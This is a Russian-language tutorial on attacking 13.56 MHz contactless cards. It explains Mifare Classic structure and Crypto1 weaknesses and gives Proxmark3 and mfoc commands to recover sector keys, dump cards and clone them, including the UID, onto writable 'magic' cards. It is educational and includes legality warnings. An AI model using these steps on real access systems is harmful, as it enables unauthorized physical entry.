Карты 13.56 МГц (HF) — второй большой класс бесконтактных карт после LF 125 кГц. Самые распространённые: **Mifare Classic** (сломанная криптография Crypto1) и **Mifare Ultralight/NTAG** (без криптографии, UID-защита). Именно их чаще всего используют в системах доступа, транспорте и метках. Этот урок — практическая работа с HF-картами: чтение, атаки на Crypto1 и клонирование.

## Mifare Classic: устройство

Mifare Classic 1K/4K состоит из **секторов** (16 или 40), каждый — из 4 блоков по 16 байт. Последний блок сектора — **trailer** с ключами A и B и битами доступа (access bits).

```text
Сектор 0: блок0 (UID/производитель), блок1, блок2, блок3 (trailer: KeyA|access|KeyB)
```

**Crypto1** — проприетарный потоковый шифр NXP, который был реверс-инженерен (Garcia et al., 2008). Он содержит слабости, позволяющие восстановить ключ по нескольким аутентификациям.

## Атаки на Crypto1

- **nested** — восстановление ключа одного сектора, зная ключ другого (нужен хотя бы один известный ключ).
- **darkside** — восстановление ключа без знания других (работает не на всех картах/ридерах).
- **hardnested** — современный метод для карт, устойчивых к darkside.
- **staticnested** — для карт с предсказуемым nonce.
- **mfoc / mfcuk** — готовые инструменты (nested/darkside).

```bash
# mfoc: nested-атака с дефолтными ключами
mfoc -O card.dump
# Если есть один известный ключ:
mfoc -k FFFFFFFFFFFF -O card.dump
# Proxmark3: автовосстановление всех ключей
proxmark3
> hf mf autopwn
> hf mf dump
```

## Ultralight и NTAG

**Mifare Ultralight** и **NTAG** — простые карты/метки без криптографии. Данные хранятся в страницах по 4 байта; UID в первой странице. Доступ обычно без ключей.

```bash
# Proxmark3
> hf mf ultralight read
> hf mf ultralight dump
# Запись
> hf mf ultralight write --page 4 --data 01020304
```

Клонирование Ultralight/NTAG тривиально: считать страницы и записать на «болванку» (Magic-карта с изменяемым UID).

## Разобранный пример: клонирование Mifare Classic

```bash
proxmark3 /dev/ttyACM0
# 1. Определить карту
> hf search
# MIFARE Classic 1K
# 2. Автовосстановление ключей
> hf mf autopwn
# [+] Found Key A: FFFFFFFFFFFF
# [+] Found Key B: FFFFFFFFFFFF
# 3. Дамп всех секторов
> hf mf dump
# 4. Проверить дамп
> hf mf chk --dump
# 5. Записать на Magic-карту (UID-изменяемую)
> hf mf cload --file dump.bin
# 6. Проверить эмуляцию/копию
> hf mf sim
```

Magic-карты (UID-изменяемые) позволяют клонировать даже UID, что обходит системы, проверяющие первый блок.

## Частые ошибки и подводные камни

- **Darkside не работает** на новых картах — используйте hardnested.
- **Нужен хотя бы один ключ** для nested.
- **Trailer-блок**: запись неправильных access bits может «залочить» сектор.
- **Magic vs обычная болванка**: для клона UID нужна Magic-карта.
- **Антенна/расстояние**: HF чувствителен к позиционированию.
- **Эмуляция требует Proxmark**: не все устройства эмулируют Classic.

## Mifare Classic 4K и структура памяти

Classic 4K отличается от 1K структурой: первые 32 сектора — по 4 блока (как в 1K), последние 8 секторов — по 16 блоков. Общий объём — 4096 байт (минус trailer-блоки). Это важно при дампе: инструменты должны корректно обходить сектора разного размера.

```text
Classic 1K: 16 секторов × 4 блока × 16 байт = 1024 байта
Classic 4K: 32 сектора × 4 блока + 8 секторов × 16 блоков = 4096 байт
```

Сектор 0, блок 0 — «производительский»: содержит UID (4 или 7 байт), BCC, SAK, ATQA. Он **read-only** на обычных картах, поэтому для клонирования UID нужна Magic-карта. Остальные блоки — данные и trailer.

## Access bits и права доступа

В trailer-блоке (последний блок сектора) лежат: KeyA (6 байт), **access bits** (4 байта), KeyB (6 байт). Access bits определяют права на чтение/запись/инкремент/декремент для каждого блока и для самого trailer.

```text
Trailer: [KeyA:6][AccessBits:4][KeyB:6]
```

Неправильные access bits могут **заблокировать** сектор: например, если запретить запись trailer и забыть ключ, сектор станет недоступным. При клонировании сохраняйте trailer как есть — инструменты (`mfoc`, Proxmark) переносят его корректно. Некоторые системы используют нестандартные ключи и биты для защиты данных.

## Клонирование и эмуляция: тонкости

- **UID-проверка**: если система сверяет UID, обычная копия не подойдёт — нужна Magic-карта (UID-writable).
- **SAK/ATQA**: некоторые ридеры проверяют тип карты; Magic-карты эмулируют нужный тип.
- **Эмуляция**: Proxmark может эмулировать Classic, но не все ридеры с ней «дружат» (тайминги).
- **Ключи**: восстановленные ключи нужны и для эмуляции, и для клона.

Порядок: `hf search` → `hf mf autopwn` → `hf mf dump` → `hf mf cload` на Magic-карту → проверить на целевой системе.

## Практический стенд

- **Proxmark3 (RDV4/Easy)** — основной инструмент.
- **Magic-карты (UID-writable)** — для клонов с UID.
- **ACR122U + libnfc** — для чтения с ПК.
- **Своя карта-жертва** — для тренировки атак.

Правило: не клонируйте карты чужих систем и не эмулируйте их в боевых условиях без согласия. Используйте свои карты и лабораторные ридеры.

## Crypto1: как работает атака

Crypto1 — потоковый шифр с 48-битным ключом и 48-битным LFSR. Слабость в том, что часть состояния LFSR (nonce) предсказуема и повторяется, а фильтрующая функция имеет низкую нелинейность. Это позволяет применить корреляционный анализ и восстановить ключ.

- **Nested**: имея ключ одного сектора, вы можете аутентифицироваться и наблюдать nonce для других секторов, восстанавливая их ключи.
- **Darkside**: без известных ключей, используя ошибки аутентификации для сбора nonce; работает на старых картах/ридерах.
- **Hardnested**: собирает пары (nonce, keystream) и решает систему для устойчивых карт.

```bash
# Proxmark3: сбор данных и восстановление
> hf mf nested --1k --blk 0 -a -k FFFFFFFFFFFF
> hf mf hardnested --blk 0 -a -k FFFFFFFFFFFF --tblk 4 --ta -tb
```

Практически `hf mf autopwn` автоматизирует выбор метода под карту.

## Резюме и сравнение карт

| Карта | Частота | Крипто | Клонируется |
|-------|---------|--------|-------------|
| EM4100/HID Prox | 125 кГц | нет | да, тривиально |
| Mifare Ultralight/NTAG | 13.56 | нет | да |
| Mifare Classic | 13.56 | Crypto1 (сломан) | да (autopwn) |
| Mifare DESFire EV1/EV2 | 13.56 | AES/3DES | нет (интеграция) |
| EMV | 13.56 | крипто | нет (relay) |

Понимание этого спектра позволяет быстро оценить систему: если используются LF или Classic — она уязвима к клонированию; если DESFire/EMV — атаковать надо интеграцию.

## Практические советы по работе с HF

- **Держите карту ровно** на антенне Proxmark — HF чувствителен к позиции.
- **Питание**: Proxmark должен получать достаточный ток, иначе атаки срываются.
- **Тип карты**: сначала `hf search`, потом выбирайте метод.
- **Magic-карты**: покупайте заранее, они нужны для клонов с UID.
- **Бэкап дампа**: сохраняйте оригинал перед записью.
- **Не экспериментируйте на боевых картах** — используйте свои.
- **Проверяйте прошивку Proxmark**: старые версии не поддерживают hardnested.
- **Логируйте шаги**: сохраняйте дампы и ключи — они нужны для отчёта и отката.

Эти мелочи отличают успешную атаку от «карта не читается». Практикуйтесь на своих картах, прежде чем работать в реальной системе. Помните: клонирование чужой карты доступа — это неправомерный доступ, даже если технически это занимает минуты.
